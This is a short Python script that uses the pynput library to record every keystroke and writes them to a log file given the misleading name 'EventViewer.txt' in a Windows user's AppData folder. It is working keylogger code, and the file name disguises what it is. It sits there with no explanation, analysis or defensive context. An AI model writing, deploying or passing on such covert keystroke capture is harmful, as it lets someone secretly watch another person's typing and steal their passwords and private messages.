from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename=("C:\\Users\\George\\AppData\\Local\\EventViewer.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
def test(k):
    logging.info(str(k))
with Listener(on_press=test) as abc:
    abc.join()
